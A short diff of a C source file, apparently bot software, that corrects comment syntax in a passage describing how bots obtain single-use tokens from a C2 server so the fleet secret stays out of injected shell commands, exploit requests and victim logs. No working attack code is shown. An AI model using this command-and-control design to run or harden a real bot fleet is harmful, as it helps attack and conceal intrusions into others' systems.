@@ -1285,7 +1285,7 @@ int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
  * token from the C2 (GET /bot/token; http_get_url appends ?secret= so the
  * token endpoint itself stays fleet-authenticated) and puts THAT in the
  * URL: /bot/notnet?token=<tok>. The C2 consumes the token on first use.
- /* #314: the legacy ?secret= fallback re-opens the CWE-200 exposure
+ * #314: the legacy ?secret= fallback re-opens the CWE-200 exposure
   * #190 closed (fleet secret in the injected shell command, exploit
   * request body and victim logs) and the secret authenticates every
   * bot channel (#164/#167/#173) — so it is OPT-IN via
